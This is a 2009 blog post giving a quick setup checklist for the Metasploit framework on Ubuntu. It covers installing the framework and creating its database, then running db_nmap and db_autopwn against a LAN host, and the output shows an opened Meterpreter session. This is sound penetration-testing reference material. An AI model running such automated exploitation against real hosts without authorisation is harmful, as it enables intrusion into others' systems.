---
id: 33
title: Metasploit Ubuntu Checklist
date: 2009-07-05T15:55:00+00:00
author: Devin Ertel
layout: post
guid: http://www.infointox.net/?p=33
permalink: /?p=33
blogger_blog:
  - informationintoxication.blogspot.com
blogger_author:
  - Devinhttp://www.blogger.com/profile/15793900111446118223noreply@blogger.com
blogger_permalink:
  - /2009/07/autopwn-on-ubuntu.html
categories:
  - metasploit
tags:
  - metasploit
---
So I just got a new computer and have been setting up my work environment. One thing I always forget is getting metasploit running with autopwn. I only seem to do this when I either get a new machine or rebuild, which is not that often. I feel like once you have autopwn going, metasploit is at a good point for exploiting and developing.

This post is going to be a quick reference list of getting the framwork up and going. At the time of this post it was Ubuntu 9.04 and Metasploit 3.2 .
  
<span style="font-weight: bold;"><br /> 1. Get Metasploit:</span>
  
I always get metasploit through subversion. Do it anyway you like.

<div class="wp_syntax">
  <table>
    <tr>
      <td class="code">
        <pre class="apt_sources" style="font-family:monospace;">$sudo apt-get install subversion
$svn co <span style="color: #009900;">http://metasploit.com/svn/framework3/trunk/</span></pre>
      </td>
    </tr>
  </table>
</div>

<span style="font-weight: bold;"><br /> 2. Install Ubuntu debs:</span>
  
Add any others that you think are necessary.

<div class="wp_syntax">
  <table>
    <tr>
      <td class="code">
        <pre class="apt_sources" style="font-family:monospace;">$apt-get install ruby rubygems sqlite libsqlite3-ruby libopenssl-ruby nmap</pre>
      </td>
    </tr>
  </table>
</div>

<span style="font-weight: bold;">3. Create Metasploit DB:<br /> </span>In the example below, mine was already created.

<div class="wp_syntax">
  <table>
    <tr>
      <td class="code">
        <pre class="bash" style="font-family:monospace;">msf <span style="color: #000000; font-weight: bold;">&gt;</span> db_driver sqlite3
<span style="color: #7a0874; font-weight: bold;">&#91;</span><span style="color: #000000; font-weight: bold;">*</span><span style="color: #7a0874; font-weight: bold;">&#93;</span> Using database driver sqlite3
msf <span style="color: #000000; font-weight: bold;">&gt;</span> db_create
<span style="color: #7a0874; font-weight: bold;">&#91;</span><span style="color: #000000; font-weight: bold;">*</span><span style="color: #7a0874; font-weight: bold;">&#93;</span> The specified database already exists, connecting
<span style="color: #7a0874; font-weight: bold;">&#91;</span><span style="color: #000000; font-weight: bold;">*</span><span style="color: #7a0874; font-weight: bold;">&#93;</span> Successfully connected to the database
<span style="color: #7a0874; font-weight: bold;">&#91;</span><span style="color: #000000; font-weight: bold;">*</span><span style="color: #7a0874; font-weight: bold;">&#93;</span> File: <span style="color: #000000; font-weight: bold;">/</span>home<span style="color: #000000; font-weight: bold;">/</span>asdf<span style="color: #000000; font-weight: bold;">/</span>.msf3<span style="color: #000000; font-weight: bold;">/</span>sqlite3.db
msf <span style="color: #000000; font-weight: bold;">&gt;</span> db_connect
<span style="color: #7a0874; font-weight: bold;">&#91;</span><span style="color: #000000; font-weight: bold;">*</span><span style="color: #7a0874; font-weight: bold;">&#93;</span> Successfully connected to the database
<span style="color: #7a0874; font-weight: bold;">&#91;</span><span style="color: #000000; font-weight: bold;">*</span><span style="color: #7a0874; font-weight: bold;">&#93;</span> File: <span style="color: #000000; font-weight: bold;">/</span>home<span style="color: #000000; font-weight: bold;">/</span>asdf<span style="color: #000000; font-weight: bold;">/</span>.msf3<span style="color: #000000; font-weight: bold;">/</span>sqlite3.db
msf <span style="color: #000000; font-weight: bold;">&gt;</span></pre>
      </td>
    </tr>
  </table>
</div>

<span style="font-weight: bold;">4. Run autopwn:<br /> </span>This is all at the very basic level, just testing if it works.

<div class="wp_syntax">
  <table>
    <tr>
      <td class="code">
        <pre class="bash" style="font-family:monospace;">msf <span style="color: #000000; font-weight: bold;">&gt;</span> db_nmap 192.168.1.2
msf <span style="color: #000000; font-weight: bold;">&gt;</span> db_autopwn <span style="color: #660033;">-e</span> <span style="color: #660033;">-p</span> <span style="color: #660033;">-b</span>
msf <span style="color: #000000; font-weight: bold;">&gt;</span> sessions
&nbsp;
Active sessions
===============
&nbsp;
Id  Description  Tunnel
<span style="color: #660033;">--</span>  <span style="color: #660033;">-----------</span>  <span style="color: #660033;">------</span>
<span style="color: #000000;">1</span>   Meterpreter  192.168.1.1:<span style="color: #000000;">60781</span> -<span style="color: #000000; font-weight: bold;">&</span>gt; 192.168.1.2:<span style="color: #000000;">15786</span>
&nbsp;
msf <span style="color: #000000; font-weight: bold;">&gt;</span> sessions <span style="color: #660033;">-i</span> <span style="color: #000000;">1</span>
<span style="color: #7a0874; font-weight: bold;">&#91;</span><span style="color: #000000; font-weight: bold;">*</span><span style="color: #7a0874; font-weight: bold;">&#93;</span> Starting interaction with <span style="color: #000000;">1</span>...
&nbsp;
meterpreter <span style="color: #000000; font-weight: bold;">&gt;</span></pre>
      </td>
    </tr>
  </table>
</div>

Like I said this is all basic and just a quick checklist to get it going. I have never wrote this down because I always felt like I would remember. Anyways if anyone else has some stuff they add or do to get their base framework going, I would love to hear about it.

<span style="font-weight: bold;">References:</span>
  
<http://metasploit.com/>
  
<http://en.wikibooks.org/wiki/Metasploit/UsingMetasploit>